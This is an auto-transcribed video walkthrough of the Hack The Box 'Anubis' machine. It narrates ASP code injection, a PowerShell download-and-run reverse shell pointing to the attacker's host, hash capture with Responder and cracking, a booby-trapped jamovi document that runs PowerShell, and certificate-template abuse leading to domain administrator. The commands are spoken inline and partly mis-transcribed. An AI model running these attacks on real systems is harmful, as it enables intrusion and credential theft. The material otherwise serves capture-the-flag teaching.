 what's going on YouTube this is ipsag we're doing Anubis from hack the box which was an insane Windows box that was really about four steps it starts off with finding a website that has a contact form they can inject ASB code in that gets you a shell as the system user but you're in a Docker container so you got to do some pivoting around you notice a second website that's exposed to that dock container that enables remote installs so you can use that if you point it to yourself to steal the net ntl mv2 hash of the user that logs in to install software with that credential you can then access a file share on Anubis itself and Trigger another rce vulnerability through putting a malicious jamovi document I think I pronounced that correctly but administrator opens it you get code execution as him and then he has ability to change a certificate template that allows you to enroll a smart card login for administrator and impersonate him it's a lot of steps so let's just jump in as always we start off with the end map so Dash SC for default scripts SV enumerate versions OA output all formats playing the nmap directory and call it Anubis and then the IP address of 101011.102 this can take some time to run so I've already ran it looking at the results it looks like we have four ports open the first one I see is msrpc that's Microsoft Remote procedural call on 135 and whenever I see that I look for the 445 to indicate that SMB is open and when I also see SMB is open I like running crack map exec so CME SMB 1010 11.102 and that should get me some more information about this box we can see it says the host name is Earth and the domain is windquark.hdb hdb or um SMB signing is set to true and SMB version 1 is disabled so with that being said let's just go on to the next Port we have https on 443 and it's giving us this Microsoft HTTP API httpd 2.0 and when you see this this is coming from http.sys not IIs that's what that server header on Windows normally means and we also have the common name as www.windcorp.htb so we should go into our host file and set that so let's do sudo VI Etsy host and then we'll do 10 10 11 102 win uh www.winquip.hdb I'm also going to set Earth because we know that from um crack map exact and wincorp.hdb and Earth dot windcore dot hdb so we have a list of a bunch of potential host names of the box uh then 445 is open 593 I don't know exactly what port this is so we should take a look at it so Port 593 windows and let's see brip Suite is intercepting turn that off and I have no clue what just happened there Port 593 windows and maybe it's a domain controller but I don't see like 3306 so nc-z V 10 10 11 101 or 102 3306 well not three three or six um that's my sequel uh 338.9 is ldap I believe and I'm not getting connection back on that let's just try 443 real quick so normally um domain controllers will have ldap open and I'm just going to Google for my sanity uh 389. not 3389 but it still doesn't work and we can try 636 as well does not work but since we know this is a Windows box I'm just gonna do a full port skin anyways so Dash p dash 10 10 11.102 that's V and we'll put it in nmap Anubis all ports so with that stuff running we can go take a look at the web server so 10 10 11.102 and we have to specify https most likely there we go except this certificate if we look at the certificate this is where um nmap pulled the information from the common name as www.windcorp.htb so let's go over to this and see what we have there is loading but again specify https accept this certificate and we get a page now what I'm going to do is take a look at this in brip Suite real quick so let's go to proxy clear that refresh this Center repeater and what I'm getting is the server header Microsoft IAS 10.0 so something's different between going to just the IP address and going to this hostname I'm guessing like http.sys is acting as some type of router and I'm going somewhere else right now but that is just kind of a hunch but whenever you do something on a web server and your server header changes it's a good indication that you're going to a completely different web server process so uh it's just some hidden enumeration there we can show this by if I just put the or put anything in this hairstander we have HTTP API but we put the wincorp and all of a sudden we get completely different server header there's also different tags like I don't think I got like except range this e tag let's go back do we get those accept range e tag no we did not because again that's like an IIs common thing but let's take a look at this service uh the first thing I guess we can do after clicking around to see if there's any like user input on the page it looks like we do have a contact us but we could also check for extensions so like index.php even though it's a Windows Server it's worth checking then like aspx asp HTML so it looks like it's just a static HTML page we have this bootstrap logo in the site icon and we can try this contact form so root at ipsec dot rocks subject Please Subscribe and whenever I first test out a box probably just testing some basic cross-site scripting so I'm going to make it make a request to my box so uh we'll call this contact us dot Js script uh SC or ipt there we go and then before I click that we should stand up a web server and we have our port scan finishing right there I guess I can do it on this one pseudo Python 3 Dash M HTTP server on Port 80. send the message and it says do you want to send this and a message is blank what I'm going to do is take a look at it and we can see the message is not blank we have our script but for some reason my browser didn't attempt to hit it so I'm going to click back real quick let's go back to the contact I'm gonna put something in here so ABC and then this that message don't get a hit at this point I'm thinking maybe I'm just bad at writing HTML code uh I should put this in the dub dub dub directory so I don't accidentally expose files I don't mean to and we can say task.html paste in our thing script source that looks good and let's go to localhost click on this and we get a hit the other thing that I'm now thinking of this is a https page so this could be related to um insecure resources so if you're on an https page and you try to include an HTTP resource there is a chance that just gets blocked so I'm gonna do sudo NC ovnp 443 and let's see if this comes back to us and it does so we do have a connection back so this page is definitely cross-site scriptable and the reason why it didn't work before was just uh um web server was bad so I'm going to add a dash K here and that's going to keep it open so if I can hit this preview page multiple times it looks like it can so we can see I can see that multiple connections back so I'm lazy I don't feel like standing up a proper https web server but this does let me know that someone is clicking that link so I'll just leave that going and then if we click yes on do we want to send this we just go to that page the one thing I didn't notice though is we do have dot ASP as an extension so preview.asb and with that let's start a go Buster so we have some type of Recon going in the background I'm going to do go Buster dir uh then we want to do Dash U paste in the URL extension ASP word list opt a sec list Discovery web content wrapped small words dot text and then we have to add Dash K because we want to ignore SSL errors then o for out file I'm just going to call it gobuster.help and that should be working we immediately get test.asp so it looks like that is working as intended services.asp Etc so let's go back to Google and I'm going to test for server-side template injection and if I just do ssti fuzz string and Google I believe one of these results is really good this cobot.io blog and it gives a really nice um fuzzing string and that's going to be this and this is just a bunch of different types of ssti and then you have kind of a flowchart on how to identify the um language so I'm just going to paste this in here and see what happens so if I do send message and we get a 500 server internal error I could go through uh burp suite and see exactly what happens because I think that maybe redirecting me so if I do this it makes a request to save dot ASP with this and then preview.asp because save.asp is a redirect and that redirects me to preview.asp and that's where we get this 500 server error it's a bit of pain to keep doing that in brip Suite that's why I'm going to be just doing in the web service I don't have to deal with that redirect but what is happening here let's see if I go HTTP history save um What's Happening Here is it's probably hitting this ASP page and that's saving it to my session and then I'm looking at this and I'm thinking this is just regular ASP not ASB X because of the cookie um this is like that little Master enumeration thing I'm seeing something that doesn't exist which tells me something else if it was aspx or asp.net I would see things like a view State cookie Legacy just random uh Legacy ASP does not have view State and these are the cookies it is so I'm guessing if I went to the server and looked at this session it would have this information and then on preview.asp it pulls it out of my session to display information and it's trying to display something that it can't because something in the payload broke it so let's go like click back enough it looks like it did not save so let's just do this again ipsec root Please Subscribe paste this and this is where we get that error message so I'm just going to remove a few characters at a time to see when this error message goes away and that will tell us the Bad characters so still erroring out error server error and suddenly we don't have an error it looks like we have an error whenever we do a Open Bracket or a bracket and percent potentially if I do that we get a server error so this is the bad character and this is again like an asp thing so if I did seven times seven here it's not gonna do anything it's just gonna be an error I did not actually expect the error but if I do is equal to or percent equals seven times seven let's see what happens we get 49. so we know we have code execution we could have also done response dot right seven times seven because all that equal is doing is saying explicitly write this to the page so this is just essentially shorthand for response.right so the next thing we can do is put a bunch of text and I think if I do with this it's going to try to do a response.write on this and not do anything but if I don't have that I'm going to try to call this function ASD ASD and we see an error message saying Microsoft vbscript runtime error uh tight mismatch asdsd so this is because we have bad code again if I put a valid function like response.right and then we have to put in quotes please subscribe we can see uh oh I did not expect that response Dot w-r-i-t-e maybe double quotes there we go I need double quotes but we get please subscribe and again if we just want to write to the page we don't need response.right we can just do that uh percent equals thing I believe and we see please subscribe so knowing it's VB script um we can do a payload and you might go to payload all the things and get this but I'm going to create object and I'm going to create the W script.shell object and think of this as just creating uh I don't know a good way to explain it on top of my head vbscript W script dot shell this is probably what I would start googling you see using W script.jota I guess you can command but I'm going to do that dot exec and then who am I and then we want standard out read all I'm going to try this payload I like copying it in my clipboard in case I lose it and we see NT Authority slash system which is a bit weird um I wouldn't expect to see system on a web server if I do hostname let's see what a her's name is it is web server 01 and going back to our crack map exec I thought we were Earth so that is a bit peculiar but we should just try to get a reverse Shell at this point so I'm gonna do Powershell IEX new object net dot web client download if I can type correctly download string HTTP 10 10 14 8 slash shell dot PS1 and I think that is correct let's just put a show.ps one there so I'm going to do CP user share Machine shells and then invoke is there like a TCP one line or a Powershell TCP one line dot PS1 and copy it to my working directory and I like renaming it to show.ps1 okay so we have to choose which cell we want I'm gonna try this first one first and let's just change this IP so 10 10 14 8. 9001 and if this doesn't work then I'm going to try changing all the variable names because it may be Defender that blocks us so NC lvnp 9001 and let's try sending the message the page is hanging which is actually a good sign we see a git on show.ps1 and I have a prompt here so everything is good the downside is I don't have access to up and down arrows so what I'm going to do is I'm going to use a program called r l wrap but first I'm going to run the script command I'll call this um let's see let's make the shells and script one I guess or one dot L there we go and all this command does is now log everything I'm doing to this file in case I want to go back and reference anything so I'm going to do RL rep n c l v n p 9001 let's get this shell again we have the shell and if I had I have up and down arrows now because of RL rap I can also clear the screen now an embarrassing story when I first did this box was my enumeration was not on point and I didn't realize I was running as NTR 30 system I ran who am I and saw anti-authority and just was like oh I'm the network user let's do who am I slash priv and then I saw as the impersonate was enabled and I tried to throw like Rogue potato at it and get admin but I'm already admin um and that's kind of going to show back at the beginning of the video we can now kind of piece together what happened remember when I was showing the server header and we do a host if it doesn't match what it expects the virtual host to be it's http.sys server header this Microsoft HTTP API and then when it's the right thing it's IIs and we can see this is happening because Windows is using http.sys as a Virtual Router and if it detects this hostname it sends us into whatever this is because this is definitely not the host this is an insane machine so it's not done yet if I do ipconfig we can see I got a 172 IP address so it's some type of virtualization technology most likely docker but um that is just showing us we could have decided that we were going into Docker way at the beginning when we did this enumeration um we could verify uh it's probably Docker by doing a task list and looking at the running processes um you can also do like get Dash process because we're in Powershell and let's see what process is there I don't understand what this C exec service is so I wonder if I do get process on that to see let's see get process name let's just get Dash process dash for Boost I was hoping to be able to get a like working directory of a process let's see Powershell get process working directory and we can always do task list V that may also help us uh let's try that real quick task list V that's not going to give us the working directory let's see does Powershell have it and if it doesn't come within the first like two results we'll move on uh let's see get location I was in the current directory much like working directory I don't think that's gonna be it get process location path select object path we can try this so git process select object path what does this do okay that looks promising and was it c s or exec was one of them see exact do we have anything there oh it's just in system 32 so that doesn't really help us I was hoping to be in like program files and that would tell us but let's just go to Google Search see exec SVC and let's see what is it indicates being inside of a container I'm trying to decide if this is hyper-v related Docker related some other weird thing so let's see does this say anything I have no idea what this process is for um it looks like it may be hyper-v not Docker or something but let's move on because that isn't too important if I was um you I would highly recommend looking exactly what that process is but it being in SQL and Windows system 32 leads me to believe it's a Microsoft Windows thing like hyper-v if it was DACA or something like that I would expect it to be in like program files uh we could probably real quick Google I'm on this tangent I want to know right now um let's say presence indicates maybe it is stalker Docker on Windows yeah maybe it is darker no idea uh reg query Services CS exact I was seeing if this would say like I'd like to be able to run a command and see Docker somewhere um if I do dirc colon backslash do we have like a DOT Docker EV uh it doesn't look like we do let's see CD backslash GCI Dash hidden I think would show hidden files and I don't see any Docker environment file so maybe when we root the Box we can look at processes running and see if Docker is one um it's definitely some container user because we have container here I'm gonna do dir administrator desktop to see if we have a flag we don't have a user.txt but we do have rec.txt which probably stands for request so let's take a look at that if I do CD slash to that we type rec.txt um type is just like cat and windows um I could also do I think git content which is the Powershell way same exact thing um I find myself using CMD commands more often than Powershell just because I've used them for many years before switching over to Powershell so muscle memory uh let's add this file on a box okay then we can use open SSL to decode it so open SSL request in rec.txt uh no owl text and we can see what this certificate is and we can see we have a different name softwareportal.wincorp.hdb so what I'm going to do is just put this in the host header to see if we can access it so I'm going to paste this and we get the not found so that is not correct but we should still put this in our host file so sudo VI Etsy host and now we have to search for what uh salt for a portal is uh the very first thing I probably do is look at the host file of this box so CD slash Windows um is it system 32 drivers Etsy yep and then we can type Hurst and see what's in this file and it looks like everything is commented so we don't have anything we can try pinging it so let's just cat so we can copy and paste it so do we have this resolution the host we don't um the next thing I'd probably do is try to enumerate other things on this network now this is a huge subnet um 25255 240.0 so this is gonna be a huge end map if we did something so I'm just going to start off with the Gateway uh we should always be able to Ping the Gateway so ping 127 or 172 27 240.1 come on we should yep we get the pain response so I'm gonna test other ports um I'm just gonna try curl and if we get a page back let's see I believe that is good because it's not saying like connection refused uh we could probably do is it test connection and Powershell let's see Powershell test connection see exactly how to use this command I'm pretty sure it's a SP uh accept support so let's see port so Dash TCP port and probably let's see Target name and TCP Port is what I'm going to do Target name 172 27 240.1 TCP Port is that what I said yep and we'll give it 80. let's do 81. so I wonder if error messages are not being displayed this is weird so let's just set up a um tunnel so we get out of this reverse shell because I'm suspecting error messages may not be displayed which does screw us over so I should have saw like invalid command by putting all that so at least I think I should have but easy thing to do is just test it from our box so I'm going to go into program data and I'm going to put chisel in this box I'm just going to download chisel so chisel GitHub and then we can go to the page releases [Music] we need both the windows x64 most likely so we can save that and then we want to make sure we get the Linux AMD 64. for some reason I have a habit of always grabbing either Darwin or arm make sure you do AMD 64. download both of those and let's put them in our www directory so move downloads chisel and notice we never hit anything on 443 so that like xss testing um never worked great there was no cross-site scripting there let's just gzip Dash I think it's just I think we do Dash D Linux that looks fine and I like renaming these to just chisel and chisel.exe so gzip Dash D chisel and then move this one to it doesn't have a exe by default there we go it's going to run file against them both that's an elf and that's a pe32 that looks good so I should be able to go over here I'm in C colon backslash program data which is generally user writable and where I write everything to 10 10 14 8 slash chisel.exe Dash o for our file chisel.exe and I should see I hit back so we have confirmed it's downloading I'm just going to get rid of this one netcat because it's not used and I want to see the full lines so we have chisel I'm going to try to execute it so dot slash chisel exe and we can see it awesome so let's go down here chmod plus X on chisel I'm gonna do a chisel server and then I'm going to enable socks 5 and reverse uh we probably also should do a different port I'm going to specify 8000. uh port 8080 is in use because of burp Suite so we have that listening so I should be able to do dot slash chisel.exe [Music] client 10 10 14 8.8 000 and then capital r for reverse lowercase socks I think it's just sucks it may be socks five we'll try that and it looks like we have one session so let's go and test this out so sudo VI Etsy proxy chains .com and my sox5 is going to Port 1080 that is good so I should be able to do nmap Dash S capital T um and we need to do proxy chains the reason why we're doing capital t is because we want to do a full TCP port scan whenever you're going through a proxy you can't do syn scans and that is the default way of nmap so we do Dash St p and I think disables ping dash n disables DNS maybe it's capital p n I can't remember there's Flags off top my head but we want to check 80443 of what is the host this 172 27 240.1 so we can try this and we'll see if this works it does not look like it did try without the PN host is down so that's host Discovery so I did that correctly we have to do sudo it looks like I needed to do sudo this port shows okay I think that means it is up it is failing to do 443 so we can see Port 80 is open on this host so let's go and uh go into proxy I have a proxy set up for 1080. already if we look at this options look at this configuration just a saxophy proxy going to 1080. nothing special there so access this page and we get not found so let's go back to our host file so sudo VI Etsy host and we can change this to be the IP so 172 27 240.1 I'm going to try softwareportal.windcorp.hdb and we can take it out of this host and we have to go there so software portal.windcorp.hdb and it looks like we are getting a page and it's hanging because it's trying to go to code.jquery.com we're proxying everything out and we don't want to proxy everything out because this box can't connect to the Internet so the way around that is we can go into this options of Foxy proxy I'm going to disable burp sweet and we're going to go here save and edit pattern and the pattern I'm going to do stir dot win the court Dot hdb and I think this is going to whitelist um all right send all winco.acb things through this the one thing to keep in mind if we look at the warning of this page foxy proxy annoys everything on this page unless use enable proxies by pattern order so we have to select this flag this use enabled proxies by pattern order and now the page suddenly loads so if you wanted to proxy multiple things or only proxy like dot hdb you can just leave foxy proxy on the setting and have a rule matching hdb to go through whatever proxy you want so we get to this page there is one other thing I want to do and that is run crack map exec through proxy chains so I'm going to do sudo proxy change CME then SMB and that IP because I'm curious what this hostname is uh uh pseudo proxy oh for some reason it doesn't work with sudo okay let's just see if crack map exact Works without it and we get Earth so 445 on this host goes to uh looks like the DC but now we're here get what you want we have these various softwares and if I look at the link it is going somewhere so let's see what's a good way to show this we can copy anything so copy link then if I just paste it here we can see it goes to install.asp client 172 27 245.74 which is that our box that we're tunneling through let's see I don't have a shell I can do IP config what is it come on oh Windows IP here we go so it's trying to install it on that's 74. yeah so it's trying to install it on the box that it's requesting from now I'm kind of curious what happens if we change this port or this IP or what happens if we just click this it says starting install and then hangs so what if I change this to um let's see let's copy link I'm going to change it to my IP address 10 10 14 8. now the other thing we can do before I do this is do sudo Wireshark so I can look at all the connections coming back to me I could also do TCP dump and do it that way as well but I'm going to do Wireshark on ton zero and then I'm going to hit enter look at Wireshark the first request this is me this is probably gonna be on 1080 going to the Box and then we see something keep coming back to us and we're sending something that says hey um this port's not open we're saying I'm going to send that immediately and a reset so if I look at this we can see the source Port is set to 59.85 this is when RM so chances are this install.ps1 is calling winrm to go install software now one thing we could do to this is try to intercept the um user account that is attempting this win or M connection and responder is a great tool for that so I'm going to do sudor responder Dash I ton zero uh shoot let's see user share or not user share opt responder my responder is royally screwed so let's see python39 responder dot Pi Dash I ton zero we have to pseudo this okay that's fine um we see we can't run on point 80 because we already are running a web server but if I go and do SS lntp the key thing we want is 59.85 because that's the port it made a request to us and we are indeed listening on that port if I were on sudo with that it should tell me python39 is listening if I looked at the PID this is responder so we are listening for events let's try this again if I just copy link do this I'm going to put 10 10 14 8 like that starts install and hold on I had still had this responder DB that had this hash so let's clear out responderdb so you can see it like I said this is an insane box so I've done it before so that's a artifact I did not clean up fourteen eight responder there we go we have this hash this is a net ntlm V2 hash because the Box attempted to authenticate to us so it could do win or Emmy things or Windows remoting so let's try and crack this hash so I'm going to go into a box on my network called the Kraken because I don't like running cracking while I record videos I may have like Drop frames and other things because it's a very CPU intensive process but I can just go into hashcat we can go into hashes and I'm going to do VI and we're going to call this um we can just call it Anubis I guess paste in the hash dot slash hashcat and then we don't have to specify the mode because this is the latest version of hashcat that does have some hash identification so if I just do hashes Anubis opt wordlist rockyou.txt it's going to start an auto detect mode and then detect oh there's two different ones so it matched both net ntl and V2 and net ntl and V2 NT I have no idea what this one is but now we have to specify mode 5600. and while that runs I'm gonna go hash cat example hashes go to this wiki page I probably could have done like dash dash example hashes or something but this is just as fine I have no oh some note 22. so that password I'm not exactly sure what the NT version of net ntlm V2 is new to me but looks like it cracked or we went through Rocky very fast and it says the password is secret one two three so I'm gonna go back to my crack map exec so CME uh we did proxy chains oh we don't have to do proxy chains actually remember um I get the same host name earlier when I did proxy change through CME versus uh let's see do I have it in my history somewhere I can quickly show CME not that window here we go so epoxy chain CME SMB this gives me Earth and also if I do just 10 10 11 102 we get the same exact thing so at this point I'm somewhat confident these are the same server we can specify you local admin Dash p secret123 which is what we cracked and we'll see if we get authentication successful we do now the next thing I want to do is look at winrm because it doesn't say pound so I can't get a shell from this which does suck but that is life so I did win or M to see if I could get like a Windows modding share uh shell I can't I think if I just do dash dash shares we should be able to see all the shares that are available to us and then we can use like SMB client and stuff to go through we have sir enroll so this looks like it has a certificate server installed on it but most importantly Let's see we have read there's the shared so generally whenever I look at um shares I start with what is not default uh this is default if you have a certificate install a server installed this is just default this is just default so that's why I'm not really going into those but the shared one is interesting so I'm just going to do SMB client Dash u local admin slash uh 10 10 11 102. shared secret one two three is the password and we can browse this share so we have software and I would highly recommend downloading this gym movie software I'm not going to do it here I already have it installed in the machine I want it to and it's 200 Meg so it would take me a few minutes to download it which would just be a pain but highly recommend downloading that because it's gonna be helpful in a minute if I go into documents we can look at Analytics and we have these dot omv files if I look at extension omv omv file extension and we can see it's related to jamovi if I look for like jamovi exploit we have this GitHub page and it tells us the column name is vulnerable to cross-site scripting and electron Js so we could search more for how to do this exploit but the best way to do it uh find out is just try to replicate what the description is in order to replicate it we have to install it so I'm going to switch over to a different VM and this one has jamovi installed I had copied it to it so I'm just going to open it and we can see what this software is it's like a little spreadsheet and things like that uh it's got some notice saying hey there's this goodie issue with this version but we can ignore that it says it's in the column header right so we have to figure out how to edit this column header if I click on transform we can put something here so I'm going to try um script or alert Please Subscribe and I know live overflow is probably going to hate me for using Alert in a cross-site scripting test but I'll live so we have this column header and nothing really happened so I'm going to save it so I'm going to I guess save it as test.omv yeah we can overwrite that and then we're going to open it so let's go into documents test.omv and we have an alert box so we have triggered some type of um what is it uh cross-site scripting so we have successfully done that and every time I try to open that that was interesting if I right click transform it does execute as it's trying to pull this up so let's just create a new document that is clean of cross-site scripting and we want to try executing code real quick so let's go to transform and we're going to do a different script this will be required child underscore process then exec I'm going to run calc right all we want to do is test if we can run calc let's keep all these quotes the same script and that should be all we need I'm going to save as we can save it as test.omv sure then if I right click well it has the column name here so I don't think this is going to happen if I click on transform oh it does I can get calc that way but also if I open the document we had already saved it I think calc spawns when we open it so this is good um in order to ease this exploit I'm going to instead put of putting the whole payload inside this header I'm going to just do script source is equal to http 10 10 14 8 slash exploit.js and then we can do slash script so this way the document is going to make a request against myself and then this lets us edit this whole payload without having to create a new document so it becomes super handy I'm going to copy this file test.omv and notice it won't work here because this box has no idea who 10 10 14 8 is but I'm going to just upload it to the remote box and we'll see if it works so I'm going to copy this over to my parrot box and we'll see switching up pair it let's go places we want to go into hdb Anubis and then dub dub dub actually before we do this we can analyze the payload uh let's see can I drag and drop it this way drag drop there we go awesome so I'm looking at this on the web server this SMB share and I do see what if dot omv has a recent time stamp we can see it is 1334 and this was um 1426 so it looks like very relatively recent and this is 26 Jan and this is 26 Jan so this document seems to be the most recent that's why I'm going to download this so I'm going to do get what if Dot omv and if we did not have the movie we could have analyzed it this way so I'm going to make the omv go in there unzip dot dot slash what if Dot omv and it's very much like an Excel document we just have a bunch of um Json by cat metadata JQ Dot we can see the metadata I'm guessing this is the column headers if we put the payload and name it may have worked but again I just like installing the software because it gives us a better idea of exactly what's going on um I don't think it's in this x data we could validate it by removing everything here uh RF and then let's see where is our thing is it dub dub dub so so it's test.one V unzip test dot omv there we go if I do cat metadata.jsonjq Dot we can see one of the columns has our payload so if you didn't have the movie you could just do it that way just go in name put your payload in and then zip Dash R and call it um thing.omv and zip everything right and now we just created a movie document so let's move test.omv into www and I'm going to rename it to be what if dot omv actually um we're not downloading it over web we're just putting it through SMB client so I'm going to move test.omv to what if Dot omv and we can go back to our SMB client if I do a dir again it's still 14 26. so nothing's really changed there I'm going to put what if Dot omv do a dir again we can see the file size has changed also the timestamp has changed and that is because we have a different document here so if someone opens up this document they're going to um Trigger or cross-aid scripting which is going to make a request to a web server uh sorry about that my dog started snoring if you can hear that I'm not sure if the mic's picking that up but anyways let us go into www we called it exploit.js and we can do script slash script and then we want to require child process dot exec and then we can do Powershell IX then new object net dot web client download string HTTP 10 10 14 8 slash shell.ps1 I think it was lowercase and then do see I think I have see there we go I think that is correct so that's ending download string that's ending IX sending quote and that that looks fine let's save it and we should also stand up a web server on or stamp or reverse show Handler on 9001. and wait to see if anything hits this if I do dier again we still see it says 1429 so I'm going to wait five minutes and then we're gonna see if anything happens so sleep 300 and I'm going to pause the video so it's been way longer than just five minutes if I look at it we can see the date is still the same I can go to the first Pane and I do see a request from 10 10 11 102 trying to get slash.js but it never gets the next part of the payload so I want to take a look at sploit.js and see what I did wrong so I'm going to go vsploit.js and typically when I'm searching for errors I look at syntax highlighting first and we can see this is really really off now it's all purple because I'm missing a single quote there and that now looks all normal so I think that little simple error had uh screwed it up so let's put a document back there just in case it had changed and we're going to wait another few minutes and we'll see if the second time it hits us um if we get lucky and it executes Powershell so I'm gonna oh not gonna pause the video we have it hit right there and still don't have it getting to the next step so the next thing I'm going to do is I probably should have been doing this um like on my test environment I'm not going to put the script tags in this boy.js because it's loading a script externally so it knows it's JavaScript so maybe that will fix it uh let's put omv and then if this doesn't work we're probably going to have to update a payload in a VM and do some more testing because something weird is going on and I can't see error messages when I do it this way so do the basic changes first and then if you get lucky um you may just have it work so I'm going to pause the video and we'll wait for this to get another hit on us and there we have it we have it gettingsploit.js again and then eventually getting shell and have a connection back if I hit enter uh we have this shell if I do who am I we are now Diego Cruz so I can run um net use I wonder if I do who am I slash all of it tells me groups so I'm gonna just check this one out first and it does so there's two ways I normally view groups first is who am I slash all we can see or user or unique identifier or SID and then every group that we're a member of so we have certificate service dcom access 2000 compatibility group let's see is there any that stick out as non-default web developers right here so if I look at the win Corp domain we can see we're a web developer and then other things the other way we could look at right information is doing net user uh let's do who am I first so I get the username right net user Diego Cruz if we weren't on a domain controller we'd also need the slash domain flag but we don't need it because we are on a domain controller to a DC local accounts are also 80 accounts but the good thing about this output that I really like seeing is we could query it for any user as just a domain user and it really the one useful thing is the password last set because if you see a password last set and it's multiple years ago you could try weaker passwords against that there's the ones I would be targeting first then a password that rotates constantly um I really do like saying that flag they can also see last login so if the account's not used at all often um be wary and lastly if you're into like a network that does a lot of honeypots a really common Honeypot is to create a fake account and set the login hours to none and then put a weak password there and then just upon any successful authentication send some type of alert out but if you do a net user against that account you can see the login hours being set to nothing and you may think that's like a lose why would you set up a Honeypot that's so easily avoidable like just running this net user command uh I could detect it well number one if I know there's honey pots and I'm doing all these things it's slowing me down greatly because I always have to check if everything's a Honeypot and number two me running this net user Diego Cruz is a good indicator of compromise because it's not something most users do so if you have good alerting that would detect something like this then you don't have to worry about it as well so let's get back to the Box though this is a domain controller and based upon what we had saw earlier there was a program or a certificate Authority installed so I'm going to use the Specter Ops post so a lot of things will be based off of Specter Ops I think it's certified pre-owned right I think this is the post I use so this is a really good post explaining everything we're about to be doing and I'm going to do it two different ways the first is going to be a more automated way that um Erica had showed me let's see what is her Twitter hander handle twitter.com Erica I think zelik so most of my stuff is going to be coming from the uh post Eric ahead wrote but also we're going to be doing it the manual way without using certify so the first step is to go into sharp collections or you could just um compile it manually for doing like hack the Box things that use.net programs like certify sharp pound rubius um seat belt all those type of things I love just grabbing it from the shark collection Library it's actually in my opt so if I go to CD slash opt I have shark collection and then I just can do a get pull to update everything if I go into like.net framework 4.5 any I always pull from any be careful using like x86 or x64 x86 because they don't get compiled nearly as frequently but you can see all the net things we have we have like print nightmare better safety cats 80cs poem which may just automate this I haven't used that before um let's see what do we have that we wanted we wanted certify and rubius so I'm going to copy certify.exe uh what oh I have to go into the directory so we can copy certified.exe into Anubis then dub dub dub and then the other thing I'm going to need out of this is rubius so we can copy both those files there and then we'll have to drop them on the box so let's go into program data and then just like we did before I'm going to curl 10 10 14 8 actually I don't know if I copied them yet or download a file but I'm going to use Curl and that's o for out file certified.exe and that should have copied it there and we can do curl 10 10 14 8 rubious dot EXE and copy that I think I'm spelling that correctly took a second so yep those files now exist the other thing we have to grab is Power view so I'm just going to do a Google for that and whenever I use power view I always go for the development version and while that goes uh okay it's already there let's go switch to Dev go to man my internet is going slow right there so go back to uh server see where am I in www we can just W get that and then we also want adcs.ps1 to grab this W get this and we want to load it so I think I can just curl like 10 10 14 8 if I do powerview.ps1 it should output to standard out which means I think I just pipe it to IEX and I'm going to run like get domain user to make sure um that worked so get domain user is a power view command if I did get 80 user that's a built-in one and I think I hung the shell because I probably didn't specify a user so always should specify a user like local admin and then it'll probably take less time I think I wonder if I had to do like Dash user local admin nope there we go so Power view does work so what we're going to do in this step is run certify so let's do dot slash certify.exe and we're going to need a few arguments right so let's go and look at this we probably don't want request so we're looking for like enumeration find things like that so we have certify find we got show all permissions let's see client auth enrollee supplies subject um find vulnerable and current user this definitely sounds interesting so it's going to find vulnerable abusable certificate templates using all groups the user context is a part of so let's try running it with that first so I do certify.exe and find this and we'll see what certificates are shown if any and if that isn't there the next one I'm going to go is the enrollee supply subject but we do get a hit so looking at this we have web developers we can write the property and dackle and whatever is up here and this is oh no vulnerable certificate templates found but then it showed us this certificate which we can change and it is a enrollee supplies subject certificate and this is interesting to us because this is going to allow us to supply I believe the common name to the certificate which is what we can do to identify users by default this is just for Server authentication but we're going to be adding other things to this because we can write to this template in particular so we're going to add smart card login and I forget what the other one is off top my head but by doing that now we can create a certificate we Supply the subject as a different user let's say administrator and if it's valid for smartcard login we can now log in as that user because we have a certificate for them this whole attack is on the premise that there's more than one way to authenticate and do active directory most people know like through the username password of ntlm which is SMB or like Powershell or KOB DG now um through like Kerberos buying a username password but you can log in through just certificates itself and we create a or we change this template to allow us to create a certificate that allows us to authenticate as a different user and we can do that because we can write to this certificate so we have already Power view I believe I did the um I did not do it we need to do the adcs.ps1 anyway it downloaded so IEX will load this and that allows us to get smart card certificate Dash identity administrator and dash template name we want to specify I believe the template name of this was just web yeah template name right here is web so we're going to specify that and then we're going to add another smart card and we can say verbose but I don't think Roberto's is going to do anything because I'm not getting like standard error out of this but get smart code is going to take a while and if I looked at the box after I run this and went into like MMC certificates I could see a certificate for administrator that I have access to but the easy way to do it is just GCI which is get child item you can also do like get oh God get child item this way but I like the shorthand version and we can go into the search store by just pretending it's a drive letter so current user and my if I do recurse we don't have any and I think the reason this is and it's something that Erica had pointed out that I mentioned before is this function is trying to pull up a user and there's something weird about it um we can go into it because I know weird about it doesn't really do it justice but if I look at let's see it's in dub dub dub v80cs.ps1 user principal name so it's getting the user principal name from UPN and if you had noticed when I was doing some commands earlier let's see get 80 user um I wonder if I can just do who am I real quick to get my username who am I get 80 user Diego Cruz we should see something weird um we have wincorp.thm so it should be windquip.hdb this box was originally created for try hack me but the Creator decided to release on hack the Box instead and I guess this is an artifact that just did not get updated when renaming a domain for all those that want to rename domains don't just rebuild the whole domain because there's a lot of weird artifacts that just cause issues down the line so let's go and fix our script so I'm going to do V adcs.ps1 I have a file open somewhere it's probably in this pane and I'm going to change it from user principal name we're just going to get a different property Sam account name is also great for users so Sam account name save it and then let's I exit again and we'll see if it works um I don't know where the IEX went but we'll just load it that way and then let's do get smart card certificate and this Powershell reverse shell does not have error messages and this above command probably did give me some type of error message if you want error messages I'd highly recommend uploading netcat to this box and then doing a shell that way instead of using nashang because nashang does a lot of weird things to get it working so if you want to get error messages upload netcat use the dash e and be happy but let's see let's get the same exact GCI command with certificate and we now have a certificate so what we can do with this is pass it into rubius so we can say rubius uh eus I think I called it let me just make sure yep so we can do ask TGT and then specify the user administrator and then the certificate we want to use and then just do get credentials uh uh do I have to is it case sensitive that would be annoying taking longer I'm guessing it is case sensitive so we're doing rubious with this certificate as administrator saying hey what are my credentials and hopefully it responds back it does and we have an ntlm hash so we can see we authenticated with PK init which is the certificate as the username administrator on windcorp and then ntlm hash is this let's see if I can PS exec with that let's see PS exec dot Pi I think it's Dash hashes come on three and then administrator at 10 10 11 102. and requesting shares uploading and we have complete access so I can go CD users administrator desktop it's desktops huh desktop worked it's where that says desktops I'm not used to saying that say does desktops also work does not oh I guess it was just an error with how it was printed maybe I had a I typed s or something but that was definitely a weird visual artifact but there's one way we could get this um I'm trying to think how we can enable remote desktop um I'm gonna pause the video look up uh command I have on a cheat sheet to enable remote desktop so you can actually see the certificate store of this user so the first thing to do is see if remote desktop is enabled already I'm just going to do that by a quick netstat Dash a n and cf3389 is open and let's see I don't believe it was we have 389 but I don't see the remote desktop Port open we gotta wait for all these UDP things to finish and then just Google like command enable remote desktop may want to do CMD but looks like 